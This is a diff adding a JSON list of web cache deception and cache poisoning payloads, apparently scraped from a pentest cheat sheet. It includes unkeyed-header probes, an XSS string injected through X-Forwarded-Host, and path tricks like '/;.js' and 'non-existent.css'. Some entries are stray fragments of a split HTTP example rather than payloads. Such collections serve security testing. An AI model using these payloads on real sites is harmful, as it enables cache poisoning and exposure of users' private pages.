@@ -1,0 +1,164 @@
+[
+  {
+    "id": "web-cache-deception-1",
+    "title": "Caching Custom JavaScript",
+    "payload": "Values: User-Agent",
+    "context": "Caching Custom JavaScript",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-2",
+    "title": "Caching Custom JavaScript",
+    "payload": "Values: Cookie",
+    "context": "Caching Custom JavaScript",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-3",
+    "title": "Caching Custom JavaScript",
+    "payload": "Header: X-Forwarded-Host",
+    "context": "Caching Custom JavaScript",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-4",
+    "title": "Caching Custom JavaScript",
+    "payload": "Header: X-Host",
+    "context": "Caching Custom JavaScript",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-5",
+    "title": "Caching Custom JavaScript",
+    "payload": "Header: X-Forwarded-Server",
+    "context": "Caching Custom JavaScript",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-6",
+    "title": "Caching Custom JavaScript",
+    "payload": "Header: X-Forwarded-Scheme (header; also in combination with X-Forwarded-Host)",
+    "context": "Caching Custom JavaScript",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-7",
+    "title": "Caching Custom JavaScript",
+    "payload": "Header: X-Original-URL (Symfony)",
+    "context": "Caching Custom JavaScript",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-8",
+    "title": "Caching Custom JavaScript",
+    "payload": "Header: X-Rewrite-URL (Symfony)",
+    "context": "Caching Custom JavaScript",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-9",
+    "title": "Caching Custom JavaScript",
+    "payload": "GET /test?buster=123 HTTP/1.1",
+    "context": "Caching Custom JavaScript",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-10",
+    "title": "Caching Custom JavaScript",
+    "payload": "Host: target.com",
+    "context": "Caching Custom JavaScript",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-11",
+    "title": "Caching Custom JavaScript",
+    "payload": "X-Forwarded-Host: test\"><script>alert(1)</script>",
+    "context": "Caching Custom JavaScript",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-12",
+    "title": "Caching Custom JavaScript",
+    "payload": "HTTP/1.1 200 OK",
+    "context": "Caching Custom JavaScript",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-13",
+    "title": "Caching Custom JavaScript",
+    "payload": "Cache-Control: public, no-cache",
+    "context": "Caching Custom JavaScript",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-14",
+    "title": "Caching Custom JavaScript",
+    "payload": "[..]",
+    "context": "Caching Custom JavaScript",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-15",
+    "title": "Caching Custom JavaScript",
+    "payload": "<meta property=\"og:image\" content=\"https://test\"><script>alert(1)</script>\">",
+    "context": "Caching Custom JavaScript",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-16",
+    "title": "Tricks",
+    "payload": "https://example.com/app/conversation/.js?test",
+    "context": "Tricks",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-17",
+    "title": "Tricks",
+    "payload": "https://example.com/app/conversation/;.js",
+    "context": "Tricks",
+    "tags": [
+      "web-cache-deception"
+    ]
+  },
+  {
+    "id": "web-cache-deception-18",
+    "title": "Tricks",
+    "payload": "https://example.com/home.php/non-existent.css",
+    "context": "Tricks",
+    "tags": [
+      "web-cache-deception"
+    ]
+  }
+]
